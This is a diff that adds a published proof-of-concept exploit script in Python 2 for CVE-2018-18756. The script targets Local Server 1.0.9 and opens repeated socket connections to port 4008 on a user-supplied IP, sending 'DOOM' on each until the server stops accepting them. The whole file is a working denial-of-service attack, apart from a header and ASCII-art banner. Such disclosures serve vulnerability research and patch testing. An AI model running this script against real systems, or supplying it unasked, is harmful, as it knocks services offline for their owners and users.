@@ -1,0 +1,46 @@
+# Exploit Title: Local Server 1.0.9 - Denial of Service (PoC)
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.ujang-rohidin.blogspot.com/
+# Software Link: https://sourceforge.net/projects/local-server/files/latest/download
+# Version: 1.0.9
+# Category: Dos
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-18756
+
+# POC: 
+# 1)
+
+#!/usr/bin/python
+import socket
+
+print """
+         \\\|///
+       \\  - -  //
+        (  @ @ )
+ ----oOOo--(_)-oOOo----
+ Local Server 1.0.9 Dos
+	  Ihsan Sencan
+ ---------------Ooooo----
+                (   )
+       ooooO     ) /
+       (   )    (_/
+        \ (
+         \_)
+"""
+Ip = raw_input("[Ip]: ")
+Port = 4008 # Default port
+ 
+d=[]
+c=0
+while 1:
+    try:
+        d.append(socket.create_connection((Ip,Port)))
+        d[c].send("DOOM")
+        print "Sie!"
+        c+=1
+    except socket.error: 
+        print "+ Done! +"
+        raw_input()
+        break
